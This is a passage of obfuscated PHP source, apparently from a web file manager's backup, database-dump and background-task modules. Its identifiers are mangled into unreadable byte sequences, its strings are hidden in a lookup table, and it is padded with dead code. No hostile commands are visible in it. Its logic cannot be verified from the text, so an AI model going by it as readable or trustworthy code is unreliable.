. $íá‘…íº . $Ñù•šê×[306]); $••öİÉë = $this->lsno0357a418($Ğ€ ¥©ø[0], $®û»å‡·); return $••öİÉë; } public function pcmrabe98dd3() { $äŠ’ë˜ü =& $_SERVER[óÔë„ú]; $ÊìÚ…±¨ = mt_rand(pow(2, 14), pow(2, 16) - 1); $É¬öÆ¤ = array(); $ÑÈÜùÖ = $äŠ’ë˜ü[802]; if (strlen($ÑÈÜùÖ) < $äŠ’ë˜ü[705]) { return; } $šœ°»¾¶ = 1; $ëô›£ = $äŠ’ë˜ü[803]; if (strlen($ëô›£) < $äŠ’ë˜ü[687]) { return; } while ($šœ°»¾¶ <= (int) sqrt($ÊìÚ…±¨)) { $ã— ¡ = $šœ°»¾¶; while (!0) { $ã— ¡++; if ($ã— ¡ <= 2) { $šœ°»¾¶ = $ã— ¡; break; } else { if ($ã— ¡ < 2) { continue; } } $ì†–¸» = !0; for ($»ë©Ì¡£ = 2; $»ë©Ì¡£ <= sqrt($ã— ¡); $»ë©Ì¡£++) { if ($ã— ¡ % $»ë©Ì¡£ == 0) { $ì†–¸» = !1; } } if ($ì†–¸») { $šœ°»¾¶ = $ã— ¡; break; } } $É¬öÆ¤[] = $šœ°»¾¶; } $ıĞÒ¦ = 2; for ($ã— ¡ = $ÊìÚ…±¨; $ã— ¡ > 1; $ã— ¡--) { $ì†–¸» = !0; $œó”îñø = $äŠ’ë˜ü[804]; while (strlen($œó”îñø) < $äŠ’ë˜ü[705]) { if (!$œó”îñø) { break; } $œó”îñø++; } foreach ($É¬öÆ¤ as $¯¯Æ¨šë) { if ($ã— ¡ % $¯¯Æ¨šë == 0) { $ì†–¸» = !1; break; } } if ($ì†–¸») { $ıĞÒ¦ = $ã— ¡; break; } } return $ıĞÒ¦; $£øüµ«¢ = $äŠ’ë˜ü[805]; while ($£øüµ«¢ < $äŠ’ë˜ü[705]) { if ($£øüµ«¢ >= 0) { break; } $£øüµ«¢++; } } public function opaj7b7dc42e($— »à‹², $–»¶¿î¹) { $Ãàçı‘¶ =& $_SERVER[æÈËŒ÷È]; return call_user_func(array($Ãàçı‘¶[8], $Ãàçı‘¶[308]), $— »à‹², $–»¶¿î¹); } public function ykdubc57e695($Ğ‹Èò÷, $øÓ·¾›“) { $ÓÜÆ°†¸ =& $_SERVER[óÔë„ú]; $Ê…ùÓ™Œ =& $_SERVER[æÈËŒ÷È]; return call_user_func(array($Ê…ùÓ™Œ[309], $Ê…ùÓ™Œ[310]), $Ğ‹Èò÷, $øÓ·¾›“); $ÑúŸ¥ûÙ = $ÓÜÆ°†¸[806]; if (strlen($ÑúŸ¥ûÙ) < $ÓÜÆ°†¸[691]) { return; } } public function lsno0357a418($‡Œ¥é¤á, $§·´Ï Ë) { $ò¢ÇîÄÑ =& $_SERVER[æÈËŒ÷È]; return call_user_func(array($ò¢ÇîÄÑ[309], $ò¢ÇîÄÑ[311]), $‡Œ¥é¤á, $§·´Ï Ë); $ñ¹åæ³Å = $_SERVER[óÔë„ú][807]; if (!$ñ¹åæ³Å) { return; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[óÔë„ú][808]); $this->init(); $this->keep(); } public function init() { $Å¡çôÍé =& $_SERVER[óÔë„ú]; $this->isManual(); self::$name = date($Å¡çôÍé[809]); if (!($æ ÁÑöÀ = $this->model->lastItem())) { $æ ÁÑöÀ = $this->initData(); } else { self::$name = $æ ÁÑöÀ[$Å¡çôÍé[32]]; if ($æ ÁÑöÀ[$Å¡çôÍé[810]] == $Å¡çôÍé[91]) { self::$name = date($Å¡çôÍé[272]); $™Œ²ó¦ = intval(_get($æ ÁÑöÀ, $Å¡çôÍé[811], 0)); if (self::$manual == 0 && $æ ÁÑöÀ[$Å¡çôÍé[32]] == self::$name) { $this->model->remove($æ ÁÑöÀ[$Å¡çôÍé[475]]); } $æ ÁÑöÀ = $this->initData($™Œ²ó¦, $æ ÁÑöÀ[$Å¡çôÍé[812]]); } else { $this->checkStore($æ ÁÑöÀ[$Å¡çôÍé[812]]); } } self::$option = $æ ÁÑöÀ; } private function isManual() { $ÉºŸß“ = _get($GLOBALS, $_SERVER[óÔë„ú][813], 0); $ÉºŸß“ = intval($ÉºŸß“); self::$manual = $ÉºŸß“ && $ÉºŸß“ == 1 ? 1 : 0; } private function initData($‘«¹ØÁÏ = 0, $©è„†¢ = '') { $ãÆ€Â– =& $_SERVER[óÔë„ú]; $À¦ÖÏ‹ä = $this->model->config(); if ($©è„†¢ && $À¦ÖÏ‹ä[$ãÆ€Â–[812]] != $©è„†¢) { $‘«¹ØÁÏ = 0; } $this->checkStore($À¦ÖÏ‹ä[$ãÆ€Â–[812]]); if (self::$manual == 1) { self::$name .= $ãÆ€Â–[11] . date($ãÆ€Â–[814]); } $Õ†‚‰—ê = array($ãÆ€Â–[812] => $À¦ÖÏ‹ä[$ãÆ€Â–[812]], $ãÆ€Â–[32] => self::$name, $ãÆ€Â–[810] => 0, $ãÆ€Â–[171] => $À¦ÖÏ‹ä[$ãÆ€Â–[171]], $ãÆ€Â–[815] => self::$manual, $ãÆ€Â–[369] => array($ãÆ€Â–[816] => array($ãÆ€Â–[810] => 0), $ãÆ€Â–[817] => array($ãÆ€Â–[810] => 0, $ãÆ€Â–[818] => 0, $ãÆ€Â–[819] => 0, $ãÆ€Â–[33] => $ãÆ€Â–[12], $ãÆ€Â–[820] => 0, $ãÆ€Â–[821] => 0), $ãÆ€Â–[822] => array($ãÆ€Â–[810] => 0, $ãÆ€Â–[818] => 0, $ãÆ€Â–[819] => 0, $ãÆ€Â–[820] => 0, $ãÆ€Â–[821] => 0), $ãÆ€Â–[230] => array($ãÆ€Â–[810] => 0, $ãÆ€Â–[823] => 0, $ãÆ€Â–[824] => 0, $ãÆ€Â–[825] => 0, $ãÆ€Â–[826] => 0, $ãÆ€Â–[541] => $‘«¹ØÁÏ, $ãÆ€Â–[820] => 0, $ãÆ€Â–[821] => 0)), $ãÆ€Â–[820] => time(), $ãÆ€Â–[821] => 0); $İ¦’ÏÒ‘ = $this->model->insert($Õ†‚‰—ê); $Õ†‚‰—ê[$ãÆ€Â–[475]] = $İ¦’ÏÒ‘; return $Õ†‚‰—ê; } private function checkStore($æ¯ò’¸) { $¿Å’İ‘ = Model($_SERVER[óÔë„ú][827]); $˜Î‰ü² = $¿Å’İ‘->listData($æ¯ò’¸); $¿Å’İ‘->checkConfig($˜Î‰ü²); } public static function get() { if (!self::$option) { $†¨Öìë = Model($_SERVER[óÔë„ú][808]); $Ó£Ã‹é† = $†¨Öìë->findByName(self::$name); $†¨Öìë->parseContent($Ó£Ã‹é†); self::$option = $Ó£Ã‹é†; } return self::$option; } public static function set($ê„ã³‰) { $ªõç“…Ç =& $_SERVER[óÔë„ú]; $ÚÎ¦Éåã = self::get(); foreach ($ê„ã³‰ as $“óÌ±Ï => $ÃÚ¢ƒ‚») { array_set_value($ÚÎ¦Éåã, $“óÌ±Ï, $ÃÚ¢ƒ‚»); } Model($ªõç“…Ç[808])->update($ÚÎ¦Éåã[$ªõç“…Ç[475]], $ÚÎ¦Éåã); self::$option = $ÚÎ¦Éåã; return self::$option; } public function keep() { $µí¨ï· =& $_SERVER[óÔë„ú]; $ûË‚Ø†ú = self::get(); if (_get($ûË‚Ø†ú, $µí¨ï·[828], 0) == $µí¨ï·[91]) { return; } $this->backupKeep($ûË‚Ø†ú); self::set(array($µí¨ï·[828] => 1)); } private function backupKeep($÷ÒÑı…¡) { $ì”èŠßá =& $_SERVER[óÔë„ú]; if (self::$manual == 1) { return; } $ÄÀÚ§Ğ€ = $this->model->listData(); if (empty($ÄÀÚ§Ğ€)) { return; } $ç•·ˆã = 0; $«ªÆÌó¿ = array(); foreach ($ÄÀÚ§Ğ€ as $«Ïé¾æ¾) { if ($ç•·ˆã >= 7) { break; } $«ªÆÌó¿[] = $«Ïé¾æ¾[$ì”èŠßá[32]]; $ç•·ˆã++; } for ($ç•·ˆã = 0; $ç•·ˆã < 12; $ç•·ˆã++) { $«ªÆÌó¿[] = date($ì”èŠßá[829], strtotime("\x2d{$ç•·ˆã}\x20\x6d\x6f\156\164\150\163")); } $«ªÆÌó¿ = array_unique($«ªÆÌó¿); $ª˜ŠÔ‰´ = Model($ì”èŠßá[830])->get($ì”èŠßá[831]); foreach ($ÄÀÚ§Ğ€ as $«Ïé¾æ¾) { if (isset($«Ïé¾æ¾[$ì”èŠßá[815]]) && $«Ïé¾æ¾[$ì”èŠßá[815]] == $ì”èŠßá[91]) { continue; } if (!empty($«Ïé¾æ¾[$ì”èŠßá[32]]) && in_array($«Ïé¾æ¾[$ì”èŠßá[32]], $«ªÆÌó¿)) { continue; } $this->model->remove($«Ïé¾æ¾[$ì”èŠßá[475]]); $ñòªõ¼× = $this->backupPath($÷ÒÑı…¡, $ª˜ŠÔ‰´); IO::remove($ñòªõ¼×, !1); } } private function backupPath($Ùµó¨ˆŒ, $¦ÎøÉ = false) { $Å‹œ¿ÜÌ =& $_SERVER[óÔë„ú]; if (!$¦ÎøÉ) { $¦ÎøÉ = Model($Å‹œ¿ÜÌ[830])->get($Å‹œ¿ÜÌ[831]); } $ØÕñ¹§Ö = $Ùµó¨ˆŒ[$Å‹œ¿ÜÌ[32]]; $ô®Ïü¬ = substr(md5($Å‹œ¿ÜÌ[832] . $¦ÎøÉ . $ØÕñ¹§Ö), 0, 8); return "\x7b\x69\157\72{$Ùµó¨ˆŒ[$Å‹œ¿ÜÌ[812]]}\175\57\144\x61\164\x61\142\141\163\145\57\x62\x61\x63\x6b\x75\x70\57" . $ØÕñ¹§Ö . $Å‹œ¿ÜÌ[11] . $ô®Ïü¬; } public function db() { $€ØÜç“î =& $_SERVER[óÔë„ú]; $øƒˆ£¹à = self::get(); if (_get($øƒˆ£¹à, $€ØÜç“î[833], 0) == $€ØÜç“î[91]) { return !0; } $Ë½ó«²ü = new BackupDb(); if (!$Ë½ó«²ü->index()) { return !1; } self::set(array($€ØÜç“î[833] => 1)); return !0; } public function dbFile() { $ë†îßƒÇ =& $_SERVER[óÔë„ú]; $º…õĞ®Ò = self::get(); if (_get($º…õĞ®Ò, $ë†îßƒÇ[834], 0) == $ë†îßƒÇ[91]) { return !0; } $¬í÷Øè« = new BackupDbFile(); if (!$¬í÷Øè«->index()) { return !1; } self::set(array($ë†îßƒÇ[834] => 1)); return !0; } public function file() { $Æ†û¥Ã =& $_SERVER[óÔë„ú]; $âÔòå»½ = self::get(); if (_get($âÔòå»½, $Æ†û¥Ã[835], 0) == $Æ†û¥Ã[91]) { return !0; } if ($âÔòå»½[$Æ†û¥Ã[171]] == $Æ†û¥Ã[836]) { $‰»ÛÂñ = new BackupFile(); if (!$‰»ÛÂñ->index()) { return !1; } } self::set(array($Æ†û¥Ã[835] => 1, $Æ†û¥Ã[810] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $‡ŠàÁŒ‰ =& $_SERVER[óÔë„ú]; $Ü›õÔİˆ = Backup::get(); self::$io = $Ü›õÔİˆ[$‡ŠàÁŒ‰[812]]; self::$name = $Ü›õÔİˆ[$‡ŠàÁŒ‰[32]]; $å¼©ãÚ = new DbManage(); $ŸÏëë³­ = $å¼©ãÚ->dbType(); $šŸØ”Ğ³ = array($‡ŠàÁŒ‰[837] => $ŸÏëë³­, $‡ŠàÁŒ‰[838] => time()); Backup::set($šŸØ”Ğ³); $»êüÚÈÖ = $this->tmpFilesPath() . $‡ŠàÁŒ‰[839] . self::$name . $‡ŠàÁŒ‰[8]; del_dir($»êüÚÈÖ); mk_dir($»êüÚÈÖ); $ï®“ÌÎÅ = $µÉ®éÍÃ = 0; try { $õ·ËöÛ = $å¼©ãÚ->db()->getTables(); } catch (Exception $Ç§òãµ¸) { return !1; } $õ·ËöÛ = array_diff($õ·ËöÛ, array($‡ŠàÁŒ‰[840], $‡ŠàÁŒ‰[841])); foreach ($õ·ËöÛ as $ªÊáÄ€Š) { $ï®“ÌÎÅ += $å¼©ãÚ->model($ªÊáÄ€Š)->count(); } $ˆ¤°ä = new Task($‡ŠàÁŒ‰[842], $‡ŠàÁŒ‰[843], $ï®“ÌÎÅ, LNG($‡ŠàÁŒ‰[844]) . $‡ŠàÁŒ‰[845] . LNG($‡ŠàÁŒ‰[846])); $GLOBALS[$‡ŠàÁŒ‰[847]] = self::$name; foreach ($õ·ËöÛ as $ªÊáÄ€Š) { $“™åÓ = $»êüÚÈÖ . $ªÊáÄ€Š . $‡ŠàÁŒ‰[848]; $ôœë—’³ = null; if ($ªÊáÄ€Š == $‡ŠàÁŒ‰[849] && (!isset($Ü›õÔİˆ[$‡ŠàÁŒ‰[171]]) || $Ü›õÔİˆ[$‡ŠàÁŒ‰[171]] == $‡ŠàÁŒ‰[228])) { $ôœë—’³ = self::$io; } $µÉ®éÍÃ += $å¼©ãÚ->sqlFromDb($ªÊáÄ€Š, $“™åÓ, $ˆ¤°ä, $ôœë—’³); } unset($GLOBALS[$‡ŠàÁŒ‰[847]]); $ˆ¤°ä->end(); if ($µÉ®éÍÃ > $ï®“ÌÎÅ) { $ï®“ÌÎÅ = $µÉ®éÍÃ; } $šŸØ”Ğ³ = array($‡ŠàÁŒ‰[837] => $ŸÏëë³­, $‡ŠàÁŒ‰[833] => 1, $‡ŠàÁŒ‰[850] => $ï®“ÌÎÅ, $‡ŠàÁŒ‰[851] => $µÉ®éÍÃ, $‡ŠàÁŒ‰[852] => time()); Backup::set($šŸØ”Ğ³); if ($ï®“ÌÎÅ - $µÉ®éÍÃ > 0) { $™¤ÈËÀ¯ = $‡ŠàÁŒ‰[853]; if (!stristr(I18n::getType(), $‡ŠàÁŒ‰[854])) { $™¤ÈËÀ¯ = $‡ŠàÁŒ‰[855]; } write_log(array($™¤ÈËÀ¯, $šŸØ”Ğ³), $‡ŠàÁŒ‰[843]); return !1; } return !0; } private function tmpFilesPath() { $ğ ¡Õ±á =& $_SERVER[óÔë„ú]; $şª³…ªÀ = TEMP_FILES; if ($GLOBALS[$ğ ¡Õ±á[6]][$ğ ¡Õ±á[92]][$ğ ¡Õ±á[856]]) { $şª³…ªÀ = $GLOBALS[$ğ ¡Õ±á[6]][$ğ ¡Õ±á[92]][$ğ ¡Õ±á[856]]; if (!mk_dir($şª³…ªÀ) || !is_writable($şª³…ªÀ) || !IO::mkfile($şª³…ªÀ . $ğ ¡Õ±á[857])) { $şª³…ªÀ = TEMP_FILES; } } return $şª³…ªÀ; } } goto e™±™¹¶™Ë; bÉŒá–îÖ: class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\x72\x75\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\153\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¢‰ñóê÷, $ôê…ğ = '', $¹¬£ìß = 0, $Íáğ‚´Ò = '') { $éÈùÒÓœ =& $_SERVER[óÔë„ú]; if (self::get($¢‰ñóê÷)) { return; } $this->task = array($éÈùÒÓœ[475] => $¢‰ñóê÷, $éÈùÒÓœ[1758] => USER_ID, $éÈùÒÓœ[1647] => $Íáğ‚´Ò, $éÈùÒÓœ[526] => $éÈùÒÓœ[12], $éÈùÒÓœ[33] => $ôê…ğ, $éÈùÒÓœ[1128] => $éÈùÒÓœ[12], $éÈùÒÓœ[1126] => $¹¬£ìß, $éÈùÒÓœ[1759] => 0, $éÈùÒÓœ[1760] => 0, $éÈùÒÓœ[1761] => 0, $éÈùÒÓœ[1762] => timeFloat(), $éÈùÒÓœ[1763] => 0, $éÈùÒÓœ[1764] => 0, $éÈùÒÓœ[1765] => 0, $éÈùÒÓœ[1766] => 0, $éÈùÒÓœ[810] => $éÈùÒÓœ[1708]); $GLOBALS[$éÈùÒÓœ[1767]] = 1; Hook::bind($éÈùÒÓœ[1712], array($this, $éÈùÒÓœ[1768])); Hook::bind($éÈùÒÓœ[1769], array($this, $éÈùÒÓœ[1770])); $this->startAfter(); Hook::trigger($éÈùÒÓœ[1771], $this->task); $this->task[$éÈùÒÓœ[1764]] = timeFloat(); } public function end($ ¹‚äÙÉ = '') { $Óõòµß =& $_SERVER[óÔë„ú]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Óõòµß[1764]]) { self::valueSet($this->task[$Óõòµß[475]], !1); } $this->isEnd = !0; if ($ ¹‚äÙÉ) { $this->task[$Óõòµß[526]] = $ ¹‚äÙÉ; } self::log($Óõòµß[1772] . $this->task[$Óõòµß[475]] . $Óõòµß[1773] . sprintf($Óõòµß[910], timeFloat() - $this->task[$Óõòµß[1762]]) . $Óõòµß[1774]); Hook::unbind($Óõòµß[1712], array($this, $Óõòµß[1768])); Hook::unbind($Óõòµß[1769], array($this, $Óõòµß[1770])); $this->endAfter(); $£¹Ô±¢ = $this->task; $this->task = !1; Hook::trigger($Óõòµß[1775], $£¹Ô±¢); } public function update($˜ğÜæÆÇ = 0, $º£û½è± = false) { $—“²´ğ¬ =& $_SERVER[óÔë„ú]; $Ç—Èâªİ =& $this->task; if (!$Ç—Èâªİ) { return; } $Ç—Èâªİ[$—“²´ğ¬[1759]] += $˜ğÜæÆÇ; $Ç—Èâªİ[$—“²´ğ¬[1763]] = timeFloat(); if ($Ç—Èâªİ[$—“²´ğ¬[1126]]) { if ($Ç—Èâªİ[$—“²´ğ¬[1126]] < $Ç—Èâªİ[$—“²´ğ¬[1759]]) { $Ç—Èâªİ[$—“²´ğ¬[1126]] = $Ç—Èâªİ[$—“²´ğ¬[1759]]; } $¿ÔÛÎ½Ö = timeFloat() - $Ç—Èâªİ[$—“²´ğ¬[1762]] - $Ç—Èâªİ[$—“²´ğ¬[1765]]; if ($¿ÔÛÎ½Ö <= 0) { $¿ÔÛÎ½Ö = 0.001; } $Ç—Èâªİ[$—“²´ğ¬[1760]] = $Ç—Èâªİ[$—“²´ğ¬[1759]] / $Ç—Èâªİ[$—“²´ğ¬[1126]]; $Ç—Èâªİ[$—“²´ğ¬[1761]] = $Ç—Èâªİ[$—“²´ğ¬[1759]] / $¿ÔÛÎ½Ö; if ($Ç—Èâªİ[$—“²´ğ¬[1760]] > 0) { $Ç—Èâªİ[$—“²´ğ¬[1766]] = $¿ÔÛÎ½Ö * (1 - $Ç—Èâªİ[$—“²´ğ¬[1760]]) / $Ç—Èâªİ[$—“²´ğ¬[1760]]; } $Ç—Èâªİ[$—“²´ğ¬[1766]] = $Ç—Èâªİ[$—“²´ğ¬[1766]] <= 0 ? 0 : $Ç—Èâªİ[$—“²´ğ¬[1766]]; } $this->updateAfter(); $Ò…ø‚“÷ = 0.2; if (timeFloat() - $Ç—Èâªİ[$—“²´ğ¬[1764]] < $Ò…ø‚“÷ && !$º£û½è±) { return; } $˜Â§—Ã = self::get($Ç—Èâªİ[$—“²´ğ¬[475]]); $Ôä¿Ì—° = $˜Â§—Ã[$—“²´ğ¬[810]]; if ($Ôä¿Ì—° == self::STATYS_KILL) { $Ñ¬ıÃ´ë = array($—“²´ğ¬[1776] => LNG($—“²´ğ¬[1777]), $—“²´ğ¬[1284] => !1); Cache::set($—“²´ğ¬[1778] . $this->task[$—“²´ğ¬[475]], $Ñ¬ıÃ´ë, 30); $this->onKill(); $this->end(); die; } else { if ($Ôä¿Ì—° == self::STATYS_STOP) { $ÈÓïÇ¨ = 2; $˜Â§—Ã[$—“²´ğ¬[1765]] += $ÈÓïÇ¨; self::valueSet($Ç—Èâªİ[$—“²´ğ¬[475]], $˜Â§—Ã); sleep($ÈÓïÇ¨); $this->update(); return; } } $Ç—Èâªİ[$—“²´ğ¬[810]] = $Ôä¿Ì—° ? $Ôä¿Ì—° : $Ç—Èâªİ[$—“²´ğ¬[810]]; $Ç—Èâªİ[$—“²´ğ¬[1765]] = $˜Â§—Ã[$—“²´ğ¬[1765]] ? $˜Â§—Ã[$—“²´ğ¬[1765]] : 0; $Ç—Èâªİ[$—“²´ğ¬[1764]] = timeFloat(); Hook::trigger($—“²´ğ¬[1779], $Ç—Èâªİ); self::valueSet($Ç—Èâªİ[$—“²´ğ¬[475]], $Ç—Èâªİ); } public function onKillSet($È´ƒïı, $£ûêªî“ = array()) { $this->onKillCall = array($È´ƒïı, $£ûêªî“); } public function onKill() { $œƒßµï =& $_SERVER[óÔë„ú]; self::log($œƒßµï[1772] . $this->task[$œƒßµï[475]] . $œƒßµï[1780]); Hook::trigger($œƒßµï[1781], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Á¯·öÁ) { $Å¬ûæ•” =& $_SERVER[óÔë„ú]; Cache::set($Å¬ûæ•”[1778] . $this->task[$Å¬ûæ•”[475]], $Á¯·öÁ, 60); return $Á¯·öÁ; } public static function get($Õ°Ğ×’) { $ò¨“û° =& $_SERVER[óÔë„ú]; $ÌàèÜ¤ = self::valueGet($Õ°Ğ×’); if (is_array($ÌàèÜ¤) && $ÌàèÜ¤[$ò¨“û°[1782]]) { $éú–¸ËÔ = ActionApply($ÌàèÜ¤[$ò¨“û°[1782]], array($ÌàèÜ¤)); $ÌàèÜ¤ = is_array($éú–¸ËÔ) ? $éú–¸ËÔ : $ÌàèÜ¤; } return $ÌàèÜ¤; } public static function listData() { $òÛÉë•Û = self::valueGet(); return array_sort_by($òÛÉë•Û, $_SERVER[óÔë„ú][1762], !0); } public static function kill($¥öÍ¨ëÈ) { return self::changeStatus($¥öÍ¨ëÈ, self::STATYS_KILL); } public static function stop($äúÑÏ×) { return self::changeStatus($äúÑÏ×, self::STATYS_STOP); } public static function restart($äùÌ“¢‡) { return self::changeStatus($äùÌ“¢‡, self::STATYS_RUNNING); } public static function killAll() { $Ô¡ÙÁÖ =& $_SERVER[óÔë„ú]; $ÅÈ¥Óå = self::listData(); foreach ($ÅÈ¥Óå as $ëÔ¥Ş‹®) { self::kill($ëÔ¥Ş‹®[$Ô¡ÙÁÖ[475]]); } sleep(2); foreach ($ÅÈ¥Óå as $ëÔ¥Ş‹®) { self::valueSet($ëÔ¥Ş‹®[$Ô¡ÙÁÖ[475]], !1); } } private static function changeStatus($±Àê‰‚µ, $úÄá­¢) { $ó´óšûş =& $_SERVER[óÔë„ú]; $ğ½”ú„é = self::valueGet($±Àê‰‚µ); if (!$ğ½”ú„é) { return !1; } $ğ½”ú„é[$ó´óšûş[810]] = $úÄá­¢; self::valueSet($±Àê‰‚µ, $ğ½”ú„é); self::log($ó´óšûş[1783] . $ğ½”ú„é[$ó´óšûş[475]] . $ó´óšûş[1784] . $úÄá­¢); return !0; } public static function valueGet($Ñ¹ÕÏÚ = false) { $¸úıßèö =& $_SERVER[óÔë„ú]; if ($Ñ¹ÕÏÚ) { $½ë¹Ñïš = Model($¸úıßèö[520])->where(array($¸úıßèö[97] => $Ñ¹ÕÏÚ, $¸úıßèö[33] => $¸úıßèö[1135]))->find(); return $½ë¹Ñïš ? json_decode($½ë¹Ñïš[$¸úıßèö[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ÒÒ³¦ú = false) { $¦Öòû´š =& $_SERVER[óÔë„ú]; $ÈÖÂÂÇŸ = array($¦Öòû´š[33] => $¦Öòû´š[1135]); if ($ÒÒ³¦ú) { $ÈÖÂÂÇŸ[$¦Öòû´š[1758]] = $ÒÒ³¦ú; } $à­¦ÑÈµ = Model($¦Öòû´š[520])->where($ÈÖÂÂÇŸ)->select(); $à­¦ÑÈµ = $à­¦ÑÈµ ? $à­¦ÑÈµ : array(); foreach ($à­¦ÑÈµ as $†ËıÔ¶© => $ˆÔµ“óú) { $à­¦ÑÈµ[$†ËıÔ¶©] = json_decode($ˆÔµ“óú[$¦Öòû´š[450]], !0); } return $à­¦ÑÈµ; } public static function valueSet($ÄÓñÑƒÁ, $øğ¥ÊéÚ) { $ÌÕ·Æ­  =& $_SERVER[óÔë„ú]; if (!$øğ¥ÊéÚ) { return Model($ÌÕ·Æ­ [520])->where(array($ÌÕ·Æ­ [97] => $ÄÓñÑƒÁ, $ÌÕ·Æ­ [33] => $ÌÕ·Æ­ [1135]))->delete(); } $Òå…½ = json_encode($øğ¥ÊéÚ); if (!$Òå…½) { ob_start(); var_dump($øğ¥ÊéÚ); $³µò„şé = ob_get_clean(); self::log($ÌÕ·Æ­ [1785] . json_encode_force($³µò„şé)); } if (!$ÄÓñÑƒÁ || !$øğ¥ÊéÚ[$ÌÕ·Æ­ [475]]) { return !1; } $óûäªÜğ = array($ÌÕ·Æ­ [33] => $ÌÕ·Æ­ [1135], $ÌÕ·Æ­ [1758] => USER_ID, $ÌÕ·Æ­ [97] => $ÄÓñÑƒÁ, $ÌÕ·Æ­ [450] => $Òå…½); $½•¾¤Œ = $ÌÕ·Æ­ [1786]; CacheLock::lock($½•¾¤Œ); Model($ÌÕ·Æ­ [520])->add($óûäªÜğ, array(), !0); CacheLock::unlock($½•¾¤Œ); } public static function log($±£‰¹•) { if (!GLOBAL_DEBUG) { return; } write_log($±£‰¹•, $_SERVER[óÔë„ú][1787]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ô—ş»¡‹ =& $_SERVER[óÔë„ú]; $“îª¸Š× =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ô—ş»¡‹[1788], array($this, $ô—ş»¡‹[1789])); Hook::bind($ô—ş»¡‹[1295], array($this, $ô—ş»¡‹[1790])); Hook::bind($ô—ş»¡‹[1791], array($this, $ô—ş»¡‹[1792])); Hook::bind($ô—ş»¡‹[668], array($this, $ô—ş»¡‹[1793])); Hook::bind($ô—ş»¡‹[669], array($this, $ô—ş»¡‹[1794])); Hook::bind($ô—ş»¡‹[675], array($this, $ô—ş»¡‹[1795])); Hook::bind($ô—ş»¡‹[676], array($this, $ô—ş»¡‹[1796])); Hook::bind($ô—ş»¡‹[671], array($this, $ô—ş»¡‹[1797])); Hook::bind($ô—ş»¡‹[673], array($this, $ô—ş»¡‹[1798])); Hook::bind($ô—ş»¡‹[637], array($this, $ô—ş»¡‹[1799])); Hook::bind($ô—ş»¡‹[634], array($this, $ô—ş»¡‹[1799])); Hook::bind($ô—ş»¡‹[639], array($this, $ô—ş»¡‹[1799])); Hook::bind($ô—ş»¡‹[641], array($this, $ô—ş»¡‹[1799])); Hook::bind($ô—ş»¡‹[643], array($this, $ô—ş»¡‹[1799])); Hook::bind($ô—ş»¡‹[1800], array($this, $ô—ş»¡‹[1801])); Hook::bind($ô—ş»¡‹[659], array($this, $ô—ş»¡‹[1802])); $this->sourceModelCopyFlag = !1; Hook::bind($ô—ş»¡‹[1803], array($this, $ô—ş»¡‹[1804])); Hook::bind($ô—ş»¡‹[1805], array($this, $ô—ş»¡‹[1806])); Hook::bind($ô—ş»¡‹[1807], array($this, $ô—ş»¡‹[1808])); $“îª¸Š×[$ô—ş»¡‹[1809]] = LNG($ô—ş»¡‹[1810]); $“îª¸Š×[$ô—ş»¡‹[1811]] = 0; $“îª¸Š×[$ô—ş»¡‹[1812]] = 0; $“îª¸Š×[$ô—ş»¡‹[1128]] = $ô—ş»¡‹[12]; $“îª¸Š×[$ô—ş»¡‹[1813]] = $ô—ş»¡‹[12]; $“îª¸Š×[$ô—ş»¡‹[1814]] = 0; $“îª¸Š×[$ô—ş»¡‹[1815]] = 0; $“îª¸Š×[$ô—ş»¡‹[1816]] = 0; if (!$“îª¸Š×[$ô—ş»¡‹[1647]]) { $“îª¸Š×[$ô—ş»¡‹[1647]] = LNG($ô—ş»¡‹[1817]); } } protected function endAfter() { $Ö˜ï÷Ğƒ =& $_SERVER[óÔë„ú]; Hook::unbind($Ö˜ï÷Ğƒ[1788], array($this, $Ö˜ï÷Ğƒ[1789])); Hook::unbind($Ö˜ï÷Ğƒ[1295], array($this, $Ö˜ï÷Ğƒ[1790])); Hook::unbind($Ö˜ï÷Ğƒ[1791], array($this, $Ö˜ï÷Ğƒ[1792])); Hook::unbind($Ö˜ï÷Ğƒ[668], array($this, $Ö˜ï÷Ğƒ[1793])); Hook::unbind($Ö˜ï÷Ğƒ[669], array($this, $Ö˜ï÷Ğƒ[1794])); Hook::unbind($Ö˜ï÷Ğƒ[675], array($this, $Ö˜ï÷Ğƒ[1795])); Hook::unbind($Ö˜ï÷Ğƒ[676], array($this, $Ö˜ï÷Ğƒ[1796])); Hook::unbind($Ö˜ï÷Ğƒ[671], array($this, $Ö˜ï÷Ğƒ[1797])); Hook::unbind($Ö˜ï÷Ğƒ[673], array($this, $Ö˜ï÷Ğƒ[1798])); Hook::unbind($Ö˜ï÷Ğƒ[637], array($this, $Ö˜ï÷Ğƒ[1799])); Hook::unbind($Ö˜ï÷Ğƒ[634], array($this, $Ö˜ï÷Ğƒ[1799])); Hook::unbind($Ö˜ï÷Ğƒ[639], array($this, $Ö˜ï÷Ğƒ[1799])); Hook::unbind($Ö˜ï÷Ğƒ[641], array($this, $Ö˜ï÷Ğƒ[1799])); Hook::unbind($Ö˜ï÷Ğƒ[643], array($this, $Ö˜ï÷Ğƒ[1799])); Hook::unbind($Ö˜ï÷Ğƒ[1800], array($this, $Ö˜ï÷Ğƒ[1801])); Hook::unbind($Ö˜ï÷Ğƒ[659], array($this, $Ö˜ï÷Ğƒ[1802])); Hook::unbind($Ö˜ï÷Ğƒ[1803], array($this, $Ö˜ï÷Ğƒ[1804])); Hook::unbind($Ö˜ï÷Ğƒ[1805], array($this, $Ö˜ï÷Ğƒ[1806])); Hook::unbind($Ö˜ï÷Ğƒ[1807], array($this, $Ö˜ï÷Ğƒ[1808])); } public function copyMoveStart($ëáÂ½»ú, $œè¸‘³ê, $…’éÖ¾¹, $Ö×Æ¼ÉÑ) { $ÇçâÀ»¯ =& $_SERVER[óÔë„ú]; 